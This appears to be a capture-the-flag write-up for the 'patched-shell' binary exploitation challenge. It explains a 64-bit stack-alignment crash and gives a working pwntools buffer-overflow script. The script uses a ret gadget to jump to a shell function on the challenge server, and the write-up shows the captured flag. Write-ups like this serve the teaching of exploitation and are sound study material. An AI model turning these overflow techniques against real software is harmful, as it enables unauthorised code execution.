# Binary Exploitation

## patched-shell

Okay, okay. So you were smart enough to do basic overflow huh...

Now try this challenge! I patched the shell function so it calls `system instead of execve`... so now your exploit shouldn't work! bwahahahahaha

Note: due to the copycat nature of this challenge, it suffers from the same bug that was in basic-overflow. see the cryptic message there for more information.

File: https://cdn.discordapp.com/attachments/758115188796162088/1196758922078457916/patched-shell?ex=65b8cb99&is=65a65699&hm=5795531d08ff2d5a63ea875be73ee9f2536cfa444319b1359aae42b995f9702c&

---

### Solution

![main](https://media.discordapp.net/attachments/758115188796162088/1196945018657714196/image.png?ex=65b978ea&is=65a703ea&hm=44ac90d153946f096e7e94e230d9f3bb1a07786a34742ab5c17550a27728ab2b&=&format=webp&quality=lossless&width=768&height=560)

![shell](https://media.discordapp.net/attachments/758115188796162088/1196945167123501166/image.png?ex=65b9790e&is=65a7040e&hm=fcf2f3ff8e1e3e79f8d5393d6d1f42ce93e740b280db47f2bd0404065929fd49&=&format=webp&quality=lossless&width=760&height=512)

```bash
gdb-peda$ i functions 
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  system@plt
0x0000000000401040  gets@plt
0x0000000000401050  _start
0x0000000000401080  _dl_relocate_static_pie
0x0000000000401136  shell
0x000000000040114c  main
0x000000000040116c  _fini
```

When using the `basic-overflow chall` payload and calling `system`, SIGSEGV occurs.

![system](https://media.discordapp.net/attachments/758115188796162088/1196946262126231633/image.png?ex=65b97a13&is=65a70513&hm=fa02613d81ab45c2be780b5333f39d065ff9429e8b6e8af9b19ebf68beb0a4f7&=&format=webp&quality=lossless&width=1306&height=1056)


![sigsegv](https://media.discordapp.net/attachments/758115188796162088/1196946748359327855/image.png?ex=65b97a87&is=65a70587&hm=ee725e20b93793b43dfe2ad27e6d24472906f880a2b138b1d93526ccc40dba85&=&format=webp&quality=lossless&width=1274&height=1056)

<!--
Stopped reason: SIGSEGV
0x00007ffff7e15603 in do_system (line=0x402004 "/bin/sh") at ../sysdeps/posix/system.c:148
148	../sysdeps/posix/system.c: No such file or directory.
-->

This is because some of the 64 bit libc functions require the stack to be 16-byte aligned, the address of **$rsp should ending with 0**, when they are called.

To resolve this, I add an extra `ret (0x40101a)` in the beginning of ROP chain. When `ret` is invoked, it increments $rsp by 8.


```python
from pwn import *

# p = process('./patched-shell')
p = remote('34.134.173.142', 5000)
ret = 0x40101a
payload = b"A"*72 + p64(ret) + p64(0x0000000000401136)
p.sendline(payload)
p.interactive()

"""
[+] Opening connection to 34.134.173.142 on port 5000: Done
[*] Switching to interactive mode
$ ls
flag
run
$ cat flag
uoftctf{patched_the_wrong_function}
"""
```

### uoftctf{patched_the_wrong_function}